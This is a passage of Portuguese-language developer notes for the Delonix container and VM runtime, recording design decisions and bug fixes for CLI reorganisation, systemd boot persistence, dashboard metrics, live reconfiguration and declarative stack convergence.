- `delonix ingress-proxy` (subcomando OCULTO, o processo interno do proxy L7 lançado dentro do
  netns do holder) ficou **deliberadamente de fora** desta reorganização — não é clutter visível
  (`--help` não o lista) e mexer no seu argv arriscava partir o mecanismo de re-exec que já usa.
- **Mapeamento antigo→novo**: `netns`→`net netns`, `flow`→`net flow`, `ingress`→`net ingress`,
  `egress`→`net egress`, `httproute`→`net httproute`, `tunnel`→`net tunnel`, `boot`→`net boot`,
  `cri`→`serve cri`, `api`→`serve api`, `docker-api`→`serve docker-api`, `kube`→`cluster kube`.
  **Sem aliases** — um script/pipeline que ainda invoque a forma antiga falha com "unrecognized
  subcommand", não silenciosamente.
- **Mecanismo interno intocado**: o holder netns e o re-exec de `--net <rede-custom>`
  (`container::reexec_into_netns` → `nsenter … ip netns exec`) usam interceção de
  `std::env::args()` CRUA em `main()`, ANTES do parsing `clap` — verificam literalmente
  `argv[1] == "netns"`/`argv[2] == "holder"`/`"run"`. Esse mecanismo é **completamente
  independente** do enum `Cmd` público — mover `netns` para dentro de `Cmd::Net` não lhe mexe
  em nada. Confirmado ao vivo: `container run --net <rede-existente>` neste host continua a
  ganhar IP real na SDN depois da reorganização.

## Sobreviver a um reboot (`delonix net boot`, `cmd/boot.rs`)

Não há daemon a repor estado — a persistência é do systemd, como no Podman. `net boot enable`
escreve um unit por container (`ExecStart=<exe> container start <nome>`), rootless em
`~/.config/systemd/user` + `loginctl enable-linger`, root em `/etc/systemd/system`. A infra de rede
não tem unit nenhum: sobe preguiçosamente no primeiro `container start` (`acquire` → `ensure_up`), e
as bridges/rotas/egress voltam quando um workload se liga (`ensure_net_bridge`).

Quatro defeitos corrigidos num ficheiro que não tinha um único teste, e que gera o artefacto que
decide se a máquina volta a si:

- **DESTRUTIVO**: a varredura era `starts_with("delonix-")`, e em modo root o directório é
  `/etc/systemd/system` — onde vive o **`delonix-cri.service`**. Um `net boot disable` num nó
  Kubernetes desactivava e APAGAVA o endpoint CRI do kubelet, e o `status` listava-o como se este
  comando o tivesse gerado. Os units passam a ter prefixo próprio (`delonix-boot-`), a forma legada
  continua reconhecida para limpar o que uma versão anterior instalou, e o `delonix-cri.service` é
  excluído pelo nome.
- **`--restart no` era inalcançável**: o default era `always` e o ÚNICO ramo que lia a política do
  container era `restart == "no"` — pedir `Restart=no` produzia `Restart=always`. Passou a `Option`,
  que separa «não dado» (herda do container) de «dado» (manda, incluindo `no`).
- **O `enable` só criava**: um unit cujo container foi removido ficava com o link de boot e, com
  `Restart=always` gravado, falhava em CICLO a cada arranque. Agora poda os obsoletos e diz quais.
- **Um container `--restart always` parado por um reboot não gerava unit nenhum**, e a lacuna é
  circular: o supervisor é um `fork()` cru, logo o reboot mata-o e o container fica `Crashed` sem
  PID; o `enable` só olhava para quem tinha PID vivo; e o `stack apply` também não o levanta
  («already exists, nothing to do»). O critério passou a ser «devia estar de pé» — PID vivo OU
  política `always`/`unless-stopped`. É o papel do `podman-restart.service`, aqui com um unit por
  container. `on-failure` fica de fora: quer dizer «reinicia se sair mal», não «está de pé no
  arranque».

**Fechado desde então**: as **VMs** ganharam unit (prefixo próprio `delonix-boot-vm-`, porque um
container e uma VM podem ter o mesmo nome em stores diferentes; `Type=oneshot`+`RemainAfterExit` e
não `forking`, porque o `vm start` devolve com o VMM de pé e não há processo do host para o systemd
seguir); e os **membros de um pod** ficam atrás de uma âncora (o primeiro por nome) com `After=` —
partilham a netns, e quem arranca primeiro é quem a recria, por isso N units em paralelo corriam
para ser esse. `After=` e não `Requires=`: este levaria o pod inteiro abaixo com a âncora.

**Continua por fazer**: não há Kind que exprima persistência no arranque (13 Kinds, nenhum diz
«boot»). É superfície declarativa nova e fica para a próxima major, que já traz mudanças de
fronteira.

## Output: `ls` estilo docker, `describe` estilo kubectl (`cmd/output.rs`)

Toda a formatação passa por `cmd/output.rs` — `Table` (mede as colunas pelo conteúdo real; antes
cada grupo tinha larguras hardcoded `{:<20}` e a tabela desalinhava assim que um nome as passava),
`Describe` (blocos `kubectl`-like) e `fmt_size`/`fmt_local`/`fmt_age`/`fmt_duration_secs`.
**Sem dependências novas** — não há `comfy-table`/`tabled`/`chrono` na árvore e não vale a pena
aumentar a superfície de supply-chain de um runtime de containers por um alinhador de colunas.

> **Excepção deliberada: `ratatui` (`delonix dash`).** O dashboard interactivo
> (`delonix dash` + `container/vm/network/storage/image dash`) usa `ratatui`
> (traz `crossterm`) — a única dependência de UI que quebra a regra acima, por
> decisão explícita do utilizador (queria um TUI estilo htop, não um snapshot).
> Está **confinada ao bin** (`delonix-runtime-bin`); os crates de motor
> continuam dep-limpos (`cargo tree -e normal` deles não a mostra). O modo
> `delonix dash --once` (snapshot de texto ANSI) não a usa em runtime. Registado
> aqui para a auditoria futura não a tratar como acidental — ver `cmd/dash.rs`.

### KPIs de recursos (RAM/rede/storage) + Prometheus + `dash --json`

Pedido directo do utilizador ao ver o `delonix dash`: faltavam KPIs dinâmicos
(RAM/rede/storage consumidos), a barra de actividade "não dizia muito" (só
contagem de containers, sem uptime por-recurso), o dashboard vinha em PT por
omissão (bug de i18n — nunca detectado antes), e faltava uma forma de
alimentar Grafana/outras ferramentas SRE. Tudo isto partilha UM único
colector (`delonix-mgmt::dashstats::collect`), para o TUI, o `--json`, e o
scrape Prometheus nunca divergirem na aritmética.

- **Novo módulo `delonix-mgmt::dashstats`** (`crates/delonix-mgmt/src/
  dashstats.rs`): `pub fn collect(root, include_network, include_storage) ->
  DashSummary` — contagens de containers/VMs/redes/volumes/imagens/segredos,
  `memory.current`/`memory.max` do slice cgroup inteiro (`delonix_runtime::
  slice_budget`), soma de bytes rx/tx por-container
  (`delonix_net::infra::container_net_bytes`, um `nsenter`+`cat` por
  container a correr) e uso de disco por área (`blobs+layers`/`volumes`/
  `vm-images`/`containers`, `dir_size` recursivo estilo `du`, o mesmo padrão
  de `cmd/system.rs::dir_size`/`cmd_df` — duplicado ali de propósito: um
  helper de ~10 linhas, e `delonix-mgmt` não pode depender do crate `-bin`).
  `delonix-runtime-bin` depende de `delonix-mgmt` (nunca o inverso), por isso
  `cmd/dash.rs` chama directamente para este colector em vez de reimplementar
  a agregação — single source of truth entre TUI/JSON/Prometheus.
- **BUG DE CUSTO encontrado a validar ao vivo, corrigido antes de publicar**:
  a soma de disco (`storage_bytes_*`) percorre `containers/` — em rootless
  cada container tinha uma cópia FLAT completa do rootfs (ver secção "Imagem VM
  dourada"/histórico do incidente de disk-pressure) — medido neste host (49
  containers, vários nós `kindest/node` completos): **68 GiB, mais de um
  minuto** de I/O de disco. **A cópia por container acabou na v0.59.0** (ver
  «Containers rootless partilham as layers», abaixo) e o custo desta passagem
  cai com ela; o desacoplamento abaixo continua a valer, porque `containers/`
  ainda tem as cópias legadas e as `upper/` continuam a ser percorridas. Calcular isto em linha bloquearia o TUI a cada
  tick E estouraria o timeout de scrape do Prometheus (10s por omissão).
  Corrigido com dois mecanismos de desacoplamento:
  1. `dashstats::collect` ganhou `include_network`/`include_storage`
     (`bool`), devolvendo `Option<u64>` nos campos caros quando `false` — nunca
     um "0 bytes" enganoso, sempre `None` explícito até haver uma medição real.
  2. **TUI** (`cmd/dash.rs::tui::run_interactive`): a 1ª snapshot (antes do
     terminal) só pede os campos baratos (contagens + memória — instantâneo);
     uma `std::thread` própria corre o `collect(true, true)` completo em loop
     (`SLOW_REFRESH = 15s` entre passagens) e publica num `Arc<Mutex<
     DashSummary>>` partilhado; o tick de 1s do render (sempre barato) funde
     os campos caros mais recentes desse mutex antes de construir os tiles —
     a UI nunca bloqueia, mesmo que a passagem de disco demore mais de um minuto.
  3. **`delonix-mgmt` `/metrics`**: o handler só recalcula os campos baratos a
     cada pedido; uma tarefa `tokio::spawn`ada uma vez no arranque do servidor
     (`spawn_expensive_metrics_refresh`) recalcula os campos caros a cada 30s
     em background e publica-os no registo partilhado — o scrape fica sempre
     rápido (confirmado ao vivo: ~0.15s), as gauges caras ficam "stale" por até
     30s, nunca ausentes. `GET /v1/dash` (JSON, pedido pontual dum humano/
     ferramenta) continua a fazer a colheita COMPLETA em linha — documentado
     como potencialmente lento (dezenas de segundos), não é um scrape periódico.
- **Prometheus, não gRPC, para o Grafana**: o motor já tinha um registo
  Prometheus partilhado (`delonix-runtime-core::metrics`, `prometheus-client`
  já na árvore, usado só por contadores do CRI) exposto em `/metrics` do
  `delonix-cri` (scrape do kubelet) e do `delonix-mgmt` (scrape do
  control-plane) — Grafana fala nativamente Prometheus/REST, não gRPC. Ganhou
  gauges novas: `delonix_containers_running/total`, `delonix_vms_running/
  total`, `delonix_memory_bytes_used/limit`, `delonix_network_rx/tx_bytes`,
  `delonix_storage_bytes_{images,volumes,vm_images,containers}`. `Gauge` e não
  `Counter` mesmo para os bytes "cumulativos": o valor lido do kernel É
  monótono, mas é somado por um conjunto DINÂMICO de containers que podem
  desaparecer entre scrapes (encolhendo a soma) — a API de `Counter` só
  permite `inc`/`inc_by`, que não serve para isso.
- **`delonix-mgmt` ganhou `GET /v1/dash`** (JSON do mesmo `DashSummary`) e
  passou a depender de `delonix-runtime`/`delonix-vm`/`delonix-net` (antes só
  `delonix-volume`/`delonix-image`/`delonix-scan`) — mesma expansão que o
  `delonix-cri` já tinha feito por uma razão análoga (visibilidade completa
  do motor), sem dependência circular nenhuma.
- **`delonix dash --json`** (novo, ao lado do `--once` ANSI já existente):
  `DashData`/`Tile`/`Row`/`Problem`/`DashScope` ganharam `Serialize` — um
  snapshot só, sem TUI nem ANSI, para scripts/CI ou um datasource JSON do
  Grafana. Reaproveita o `DashData::collect` de sempre (colheita completa,
  incluindo os campos caros) — o mesmo trade-off de custo do `--once`.
- **Coluna `UP` na tabela de recursos** — uptime real por-container
  (`pid_starttime` → `output::uptime_from_starttime`/`fmt_duration_secs`, o
  MESMO mecanismo do `container ls`), `-` para VM/rede/volume/imagem (nenhum
  destes guarda um starttime hoje — não fingido). Responde directamente ao
  pedido do utilizador ("a barra não diz há quanto tempo o container está a
  correr").
- **Sparkline com alternância (tecla `m`)** — em vez de só a contagem de
  containers a correr, o TUI agora rastreia DUAS séries em paralelo (ambas
  baratas, já fazem parte de cada snapshot) e a tecla `m` alterna qual delas o
  gráfico de 2 minutos mostra: containers a correr, ou memória usada (MiB).
- **BUG DE I18N encontrado e corrigido**: `cmd/dash.rs` tinha 100% do texto
  de utilizador hardcoded em PT directamente no código-fonte — zero chamadas
  a `po::t`/`po::tf`, violando a regra deste repo (fonte 100% EN, tradução via
  `pt.po`) desde que o dashboard foi escrito. Corrigido: toda a UI do dash
  (tiles, tabela, painel de problemas, rodapé do TUI) passou a EN na fonte +
  entradas novas em `data/pt.po`; `docker-api`'s about-text (gap pré-existente,
  não relacionado com o dash) também ganhou tradução de caminho.
- **Validado ao vivo neste host**: `dash --json`/`--once` (57s, incluindo o
  scan de disco completo, correcto); TUI a arrancar em segundos (não mais de
  um minuto) confirmado pelo estado do processo (`epoll_wait` em ~3s, não
  bloqueado em I/O de disco); `delonix serve api` real com `/metrics`
  (0.14-0.2s, gauges caras a preencherem-se depois da 1ª passagem em
  background) e `/v1/dash` (JSON completo, ~33s) via socket unix real.

- `container ls` tem as 7 colunas do `docker ps`. O `Up …` sai do `pid_starttime` do init e **não**
  do `created_unix`: um container criado ontem e reiniciado há 5 min mostraria "Up 1 day" — falso
  exactamente quando interessa (a depurar um crash-loop).
- `fmt_duration_secs` porta o `units.HumanDuration` do docker **à letra**, baldes incluídos (dias
  até às 2 semanas, semanas até aos 2 meses). É essa escolha de baldes — e não um caso especial —
  que impede o "1 weeks" que a primeira versão daqui imprimia.
- **`describe` é aditivo; os `inspect` ficam como estavam.** `describe` = humanos, `inspect` = JSON
  para scripts. É uma CLI pública: migrar `volumes/network inspect` de texto para JSON seria
  breaking change e não se fez.
- `stack describe` não inventa estado: o stack **não tem registo próprio**, por isso parte do
  manifesto e vai confirmar a presença de cada recurso ao store respectivo (mesma filosofia do
  `cluster ls`, que deriva das labels). Não faz drift-detection — isso é trabalho de orchestrator.

## Reconfiguração a quente (`delonix container update`)

`container update <id>` muda **portas, volumes, redes e limite de banda sem parar o container** —
o PID não muda. É a diferença de fundo para o docker (onde mudar uma porta obriga a recriar):
aqui o dataplane não pertence ao ciclo de vida do processo. Flags: `--publish-add/--publish-rm`,
`--volume-add/--volume-rm`, `--net-connect/--net-disconnect`, `--net-rate/--net-burst/
--net-rate-clear`. **Remoções correm antes das adições**, para `--publish-rm 8080 --publish-add
8080:9000` funcionar num só comando.

Isto ligou APIs do motor que existiam há muito e **nunca tiveram um único chamador** —
`mount_live`/`unmount_live`, `attach_extra_container`/`detach_extra_container`,
`set_net_rate`/`clear_net_rate`. Por nunca terem sido chamadas, tinham um bug que só apareceu
agora (ver abaixo).

**Persistência**: cada operação grava no registo assim que o dataplane confirma, uma a uma, via
`Store::update` (flock — o CRI é concorrente). Não há transacionalidade: se a terceira falhar, as
duas primeiras JÁ estão aplicadas no kernel e um registo escrito só no fim ficaria a mentir.

**Limitações conhecidas, por desenho**:
- `--net-connect`/`--net-rate` exigem `--net <rede>`: o veth e o shaping vivem no netns do holder,
  que o caminho slirp-por-container (`--net host/none`) não tem.
- `--publish-add` num container criado **sem `-p` e sem `--net <rede>`** é impossível: o
  api-socket do slirp só é aberto quando o `run` leva portas (`slirp_attach`). Erro explícito.

**BUG CORRIGIDO ao ligar isto** (`mount_live`/`unmount_live`): gatavam o `setns(user)` em
`container.userns`, mas esse campo diz se o container **criou** o seu userns — os do ingress
rootless **herdam** o do holder e ficam com `userns=false` apesar de estarem num userns diferente
do nosso. Sem o setns, o `unshare(NEWNS)` seguinte dava EPERM e **toda** a montagem a quente
falhava (código 124). É o mesmo bug que o `exec` já teve e corrigiu — passam a abrir sempre o ns
`user` e a deixar o skip-por-inode do `open_container_ns` decidir. Lição a reter: **`container.
userns` não é "está num userns diferente do meu"**; nunca o usar para essa pergunta.

## IaC nativo: `stack plan`/`apply` convergente/`destroy` (v0.47.0)

Pedido: tornar o IaC do Delonix aceitável pela comunidade **sem ser Terraform nem Ansible** — que
não sejam precisos. A revisão que o motivou está em
[docs/discovery/47_IAC_REVISAO.md](docs/discovery/47_IAC_REVISAO.md).

**O defeito estrutural que isto fecha**: o `apply` só criava. Um recurso existente imprimia
`already exists, nothing to do` e o comando devolvia **0** — mudar a imagem no manifesto não fazia
nada e reportava sucesso. Gémeo declarativo do relato desonesto que a v0.37.0 tirou do CLI
imperativo, e pior, porque o utilizador mudou o ficheiro de propósito. Agrava-o o facto de a
capacidade já cá estar: o `cmd_update` reconfigura portas/volumes/redes/memória/CPU **a quente sem
mudar o PID** e o caminho declarativo nunca lhe chamou — 5.ª ocorrência do padrão
`mount_live`/`set_net_rate`/`update_limits`/`JsonStore::update`.

- **`cmd/reconcile.rs` é PURO** — recebe os dois lados já lidos, devolve `Vec<Change>`; nunca abre
  um store nem corre um comando. É o que torna testáveis como dados os casos que interessam.
- **Diff de 3 vias.** O último spec aplicado vive no PRÓPRIO recurso
  (`delonix.io/last-applied`, o mecanismo do kubectl no sítio do kubectl) — **sem ficheiro de
  estado**, coerente com o que o projecto já publicou. É o 3.º lado que distingue «tiraste o campo
  do ficheiro» (reverte) de «alguém pôs isto à mão» (não mexe).
- **Posse por label** `delonix.io/stack` (mesmo idioma do `POD_LABEL`/`COMPOSE_PROJECT_LABEL`).
  Um recurso criado à mão é `Adopt` (dispensa um comando `import`); de outra stack é `Conflict` e
  nunca é tocado; e nem `--prune` nem `destroy` vêem o que não têm a label.
- **Fail-closed na recriação**: `-/+` nomeia TODOS os campos frios e o `apply` recusa sem
  `--replace <Kind>/<nome>`, antes da primeira criação (o apply é fail-fast sem rollback — recusar
  a meio deixaria a stack meio convergida E com erro). `--prune` nunca por omissão, e corre em
  ÚLTIMO lugar. `destroy` usa a ordem INVERSA de `KINDS`, **derivada** e não escrita 2.ª vez.
- **`--detailed-exitcode`** (0/2/1) — contrato do `terraform plan`, para um gate de deriva em CI.
- **Âmbito: 12 dos 13 Kinds convergem** (`CONVERGING_KINDS`) — Network/NetworkRoute/Volume/
  ShareVolume/Image/Vm/Container/Pod/FirewallPolicy/HTTPRoute/Ingress/Tunnel. **Esta linha já
  esteve errada duas vezes** (dizia 8, depois 11 de 12 quando o `KINDS` já tinha 13) — a lista
  autoritativa é a constante, e `stack plan --fields` imprime-a.
  **Só o `Secret` fica** «garante presente», e por uma razão que não é falta de atenção: o estado
  são valores cifrados, e um plano não os decifra para comparar. O plano marca-o `!` — **nunca o
  omite** (um plano que esconde um recurso lê-se como «sem alterações») — e o `--fields` diz o
  obstáculo concreto, porque «ainda não converge» lê-se como «ninguém chegou lá». O `Cluster`
  fica fora do próprio `KINDS` por ser um procedimento remoto e não um recurso local.
- **Dois gates novos, e cada um nasceu de um Kind que escapou.** O teste das três listas exigia a
  razão genérica para os CONVERGENTES e nunca a específica para os outros — foi por aí que a
  `NetworkRoute` entrou, aplicada e validada mas fora do `CONVERGING_KINDS`, a imprimir `!` com uma
  frase que se lê como «ninguém chegou lá» quando o que acontecia era uma EXCEPÇÃO ao isolamento
  entre redes que o manifesto não conseguia fechar. Agora um Kind ou converge ou escreve o
  obstáculo. O gate irmão (`TEARDOWN_KINDS`/`no_teardown_reason`) exige que um Kind convergente
  tenha teardown ou diga porquê — senão o `--prune` promete-o e o `destroy_one` recusa-o **a meio**,
  depois de já ter removido o resto na ordem de teardown.
- **`Desired.ownable`** separa «converge» de «é possuível». Uma `Image` é cache partilhada com
  endereço de conteúdo (o mesmo `alpine:latest` serve todas as stacks — carimbá-la para uma e
  removê-la quando essa deixasse de a declarar tirava-a debaixo das outras); uma `FirewallPolicy`
  e uma `ShareVolume` não têm registo próprio onde carimbar. As três convergem e nenhuma é
  adoptada nem podada. Sem esta distinção, um recurso sem dono aparecia como `Adopt` em TODOS os
  planos — medido, não suposto.
- **Três listas de Kinds convergentes têm de concordar, e derivaram uma vez.** O
  `CONVERGING_KINDS` decide três coisas (se o `actual_of` sonda a presença, se o
  `converge_and_stamp` aplica, se carimba) e os braços do `match` e a tabela do `--fields` são
  escritos à parte. Vm/FirewallPolicy/ShareVolume ganharam adaptador e ficaram fora da constante,
  logo eram SALTADOS — e o sintoma escondeu-se porque o `apply` antigo de cada Kind é idempotente
  e convergia pelo caminho errado. Há agora teste a exigir as três de acordo nos dois sentidos.
  **E as listas deixaram de existir** (v0.53.x): eram SEIS, cada uma ao lado de quem a consumia —
  `KINDS` (ordem do apply), `CONVERGING_KINDS`, `TEARDOWN_KINDS`, `kind_honors_namespace`, os
  `DECLARATIVOS` do teste do `wait`, e os braços do `presence()`. Passam a sair de UMA tabela,
  `cmd/kinds.rs` (`KindFacts`: domínio, forma, in_stack, converges, teardown, namespaced,
  presence), uma linha por Kind. Os três defeitos que a motivaram são da mesma família e estão no
  doc-comment do módulo: o adaptador acima, o `NetworkRoute` aplicado durante versões sem braço no
  `presence` (o `ls` a chamar «unsupported kind» a um recurso que o apply cria), e os declarativos
  que o `wait` lia como ausentes. **Um classificador só vale se governar alguma coisa**: o
  `ownable` ficou deliberadamente DE FORA — é decidido dentro de cada `desired()`, que precisa de
  um documento para correr, logo uma cópia na tabela seria a sétima lista sem nada a obrigá-la a
  bater certo. Pela mesma razão não há `is_declarative(kind)`: o `wait` decide pelo marcador que o
  store DEVOLVEU (`-`), não pelo que a tabela diz que ele devia devolver.
- **O campo de actuação passou a ser visível** — coluna `DOMAIN` no `stack ls`/`describe` e na
  tabela do `--fields` (`compute`/`storage`/`net-conn`/`net-policy`/`net-exposure`/`artifact`/
  `composition`), mais um catálogo completo no fim do `stack plan --fields` com a FORMA de cada
  Kind (`primary`, `sugar → X`, `deprecated → X`, `compat → X`, `aggregate`). As três de rede são
  separadas de propósito: um `network` único esconderia que o `NetworkRoute` abre um CAMINHO e o
  `FirewallPolicy` decide se o tráfego é PERMITIDO nele — as duas perguntas em série que este
  motor recusa fundir. A FORMA é a coluna que não se adivinha da doc de cada Kind: diz se o
  documento sobrevive ao `load`, que é a resposta a «porque é que o meu `kind: Egress` nunca
  aparece no plano com esse nome».
- **O `Storage` fora do `TYPED_KINDS` do schema é DELIBERADO, não uma lacuna** (registei-o como
  lacuna numa análise e estava errado): não tem spec própria — é reescrito para `kind: Volume` — e
  o `no_typed_schema` já trazia a dica dirigida. O que faltava era o gate: nada exigia o mesmo do
  PRÓXIMO Kind sem schema, que responderia «no typed schema for X», lido como defeito do manifesto
  quando é propriedade do Kind. `untyped_hint` + `todo_kind_conhecido_tem_schema_ou_dica`, a mesma
  exigência que o `not_converged_reason` e o `no_teardown_reason` já fazem.
- **A normalização é o ponto crítico**: se os dois lados não derem a mesma string, tudo aparece
  como deriva para sempre. O conjunto comparado é conservador, cada Kind tem teste a provar que um
  manifesto inalterado dá ZERO diferenças, e **`stack plan --fields`** diz o que é comparado e o
  que não é e porquê (`env`/`command` vêm fundidos com os da imagem, `user` é guardado como uid).
- `mount_to_spec` é o inverso do `resolve_spec` de propósito — aquele **cria** o volume, e calcular
  um plano não pode criar nada.
- **`Volume`/`Network` ganharam `labels`/`annotations`** (`#[serde(default)]`, registos antigos
  continuam válidos). O `Network` não é serde — é `key=value` com vários escritores, por isso o
  `set_metadata` reescreve LINHA A LINHA (idioma do `add_overlay_peer`) e promove um registo legado
  (octeto nu) a `base=<n>`; um valor com newline é **recusado** (partiria o registo em duas linhas).

**Schema GERADO do código (ADR-0007)** — `delonix schema print` + `delonix explain
Container.ports`, publicado em `docs/schema/v1/delonix.json` com teste a garantir que É o gerado.
`schemars` é a **2.ª excepção deliberada** à regra de sem-dependências-novas (depois do `ratatui`),
confinada ao `-bin`, com os 9 crates de motor verificados dep-limpos (`cargo tree -e normal -p <crate>` de cada um, medido: nem `schemars` nem `ratatui` aparecem em nenhum). O schema é tão estrito quanto
o motor (`additionalProperties: false`, para apanhar o typo num nome de campo), mas a lista de
aceites vem dos MESMOS `*_SPEC_FIELDS` do `warn_unknown_fields`: a forma agrupada do Container é
hoisteada antes de o `ContainerSpec` existir, e derivar a estritez só do struct sinalizaria
manifestos correctos — falso positivo, pior que a lacuna.

**BUG REAL apanhado a validar os `examples/` contra o schema**, num exemplo publicado:
`env: { POSTGRES_PASSWORD: dev }` (a forma que qualquer pessoa vinda do compose escreve) era aceite
e **silenciosamente descartada** — o Postgres do `examples/dependency.yaml` arrancava sem password.
A forma agrupada passa a ser identificada pelas suas chaves (`vars`/`files`/`secrets`/
`secretFiles`), e uma mapping simples vira `["K=v"]`.

**5.ª fusão: `ShareVolume`→bloco `share:` de `kind: Volume` (v0.53.x).** É a que estava assinalada
como candidata e a razão é mais forte do que arrumação: **um share JÁ era um volume** — o
`apply_one` sempre chamou `VolumeStore::register_external` — e o `ShareRecord` ao lado era um
SEGUNDO registo do mesmo objecto cujo único campo próprio era o `storage_ref`; mountpoint, quota,
alert e created estavam duplicados. Dois registos para um objecto é como os dois passam a
discordar, e era isso que impedia a posse: o carimbo `delonix.io/stack` vive nos `labels`, que só
o volume tem. Fechado: `Volume.parent` (`#[serde(default)]`) guarda o pai, o `ShareRecord` deixa
de ser escrito e é **absorvido no apply seguinte** — volume primeiro, registo antigo largado em
último, com o MOUNTPOINT preservado (recalculá-lo mudaria o directório debaixo de bytes já
escritos). O `kind: ShareVolume` carrega com aviso, `storageRef` continua a ser aceite como grafia
de `share.from`. Ganho medido ao vivo: `stack plan` propõe `Adopt`, o apply carimba a posse, e o
`destroy` remove os DOIS shares homónimos **sem tocar nos dados** (o `remove_with` nunca toca num
mountpoint externo — a garantia estava lá, faltava alguém chegar-lhe).
- **A identidade de um share no plano é `<ns>/<nome>`** (`scoped_plan_name`). O reconciliador
  identifica por `(kind, name)` e um share é escopado por namespace — dois inquilinos com um `db`
  é a isolação que a funcionalidade existe para dar. Sem qualificar, os dois são UM recurso: um
  aparece como deriva do outro em todos os planos, e um `--replace Volume/db` destruía os dois.
- **`Volume` é o único Kind cuja resposta a «é namespaced?» vem do DOCUMENTO** — daí
  `Namespaced::{Never, Always, PerDocument}` em vez de um booleano. Como `false`, o `load` avisaria
  «namespace has no effect» num share cuja namespace decide o directório dos dados: um aviso errado,
  que é pior que nenhum.
- **Dois bugs apanhados a validar e não a ler.** (1) O `validate_graph` recusa duplicados por
  `(kind, nome)` e chumbava dois shares homónimos em namespaces diferentes; a chave passou a
  incluir a namespace **só** para o volume-com-share. **Registei-o como bug MEU e não era** —
  medido depois contra o binário anterior à fusão: `stack apply` respondia
  `ShareVolume 'bsh' declared more than once` e o plano imprimia `ShareVolume/bsh` DUAS vezes para
  dois recursos distintos. Ou seja, dois inquilinos com um share do mesmo nome **nunca** foram
  aplicáveis por manifesto — só pela API/CLI directa, que é o que o
  `dois_namespaces_com_o_mesmo_share_nao_se_tocam` sempre provou. A fusão, com o
  `scoped_plan_name`, é o que torna a capacidade alcançável de forma declarativa. (2) `set_quota`
  trata os dois argumentos ao contrário um do outro —
  `quota: None` REMOVE o cap, `alert_pct: None` PRESERVA o limiar — por isso convergir só o
  `alertPct` apagaria em silêncio uma quota que ninguém tocou; o `converge` passa a fazer UMA
  chamada com o que não está no diff lido do registo.
- **Nota de método**: um teste que chamasse `apply_share` (que resolve `state_root()`) escreveria no
  estado REAL da máquina — só não o fez porque o volume pai não existia lá. Os testes usam
  `apply_one(&tmp, ...)`, como os vizinhos.

**Fusões de Kinds (18 → 15).** `Egress`→`FirewallPolicy` (partilhavam a struct `FwDocSpec`
inteira), `Dependency`→açúcar reduzido para `FirewallPolicy` no `load` (fundindo por ALVO, porque
várias dependências ACUMULAM allows e um documento por dependência faria a última apagar as
anteriores), `Storage`→bloco `nfs:`/`cifs:`/`webdav:` de `kind: Volume`. Os nomes antigos carregam
com aviso. **A 4.ª fusão NÃO se fez**: `kind: Container` com `spec.containers` NÃO é um `kind: Pod`
de um elemento — o primeiro cria um container chamado `<name>`, o segundo cria a netns `pod-<name>`
e chama-lhe `<name>-c0`; reescrever renomearia o container e partiria o DNS, os backends de
HTTPRoute e as referências cruzadas. Fica só o aviso de depreciação. **Regra que a fusão do Egress
revelou**: os filhos de um `kind: Stack` são construídos DENTRO do `load` e não passam pelo ciclo,
por isso qualquer redução tem de correr nos DOIS caminhos ou um grupo do Stack produz documentos
que nenhum handler reclama.

**`FirewallPolicy`: duas políticas para o mesmo (alvo, direcção) são RECUSADAS** no
`validate_graph`. O `apply_fw_doc` substitui as regras de uma direcção, logo a segunda apagava as
da primeira com ambas a reportar sucesso — e o `validate` dizia «OK». Recusar e não fundir (ao
contrário da Dependency): uma Dependency declara o acesso de um peer e várias somam-se; uma
política declara o estado desejado INTEIRO de uma direcção, logo duas são duas respostas à mesma
pergunta.

**`vm convert` fala com os ecossistemas todos** — `qcow2`/`raw`/`vmdk`/`vdi`/`vhdx`/`vhd`. Este
motor não ganha um backend por produto (o VirtualBox não coexiste com o KVM, o vSphere/Proxmox são
APIs remotas, o Hyper-V é Windows), mas uma imagem construída aqui é importada por todos. **`vhd`
é `vpc` no qemu-img e `.vhd` no ficheiro** — a única combinação em que o nome do formato e a
extensão divergem, e daí serem duas funções. `--compress` só em qcow2/vmdk, recusado nos outros
com a lista em vez de um erro do qemu-img. Validado com `qemu-img info` E `file(1)`.
**VirtualBox/VMware Workstation ficam por fazer**: `VBoxManage`/`vmrun` não existem neste host,
logo um backend seria código não validável.

**O `vm build` do VMfile foi validado ao vivo pela primeira vez** (o `virt-customize` corre neste
host; o bloqueio do `/boot/vmlinuz` a 0600 não morde). Build em 13s de uma base local, conteúdo
confirmado com `virt-cat`. Uma imagem construída passou a HERDAR distro e kernel da base quando o
`FROM` é local — **herdar metade era medivelmente pior**: com a distro da base e o release a ser
a ref do FROM, a coluna imprimia `debian/delonix-vm-base:debian-bookworm`.

**O schema dos manifestos passou a ESTÁVEL** em `docs/cli-stability.md` (estava declarado o
contrário — a CLI mais protegida que o formato que as pessoas põem em git). Guia transversal novo
em `docs/gitops.md` (plan num PR, apply no merge, gate de deriva, e o que fazer quando um apply
morre a meio). `scripts/schema-diff.sh` compara campo a campo entre duas tags e sai 1 com
diferenças.

**Cenário de caos `stack_converge`** (arnês: 20/20), com **dois** containers de propósito — o
segundo é o CONTROLO, e prova que a convergência tocou só no que o plano nomeou. A primeira versão
verificava apenas que o PID não mudava, e isso **não prova nada**: um apply que não faz nada também
deixa o PID intacto. As asserções que valem são o registo ter mudado (`memory_max`) **e** o
`stack plan --detailed-exitcode` seguinte nada ter a propor. Verificado pela regra do repo, com as
duas correcções revertidas uma de cada vez: sem `container::converge` falha em «reportou sucesso
sem convergir a memória (64M)»; sem `refuse_unallowed` falha em «a recusa mexeu no container» — o
apply destrói-o para o recriar com uma imagem que não existe, e deixa-o sem PID.

## Manifesto/apply (`delonix-manifest.yaml`)

Manifesto declarativo multi-documento, ao estilo Kubernetes (`apiVersion: delonix.io/v1` /
`kind` / `metadata.name` / `spec`), para os 5 Kinds com grupo de CLI: `Network`/`Volume`/
`Image`/`Vm`/`Container`. Parsing central em `cmd/manifest.rs` (`serde_yaml`, só neste binário —
não entra em nenhum crate de mecanismo). Cada grupo (`cmd/{network,volume,image,vm,
container}.rs`) tem um `spec` tipado próprio (`NetworkSpec`, `VolumeSpec`, ...) e uma função
`pub fn apply(docs: &[ManifestDoc])` que filtra o seu Kind e aplica.

**`kind: Workload` (ADR-0001, `docs/adr/0001-workload-kind-schema.md`)** — o começo do
Runtime Abstraction Layer: UM objecto declarativo para os dois tipos de computação.
`spec.type: container|vm|pod` + um bloco nomeado pelo tipo (`spec.container`/`spec.vm`/`spec.pod`)
que é EXACTAMENTE a `ContainerSpec`/`VmSpec`/`PodSpec` do Kind autónomo (não redefine um único
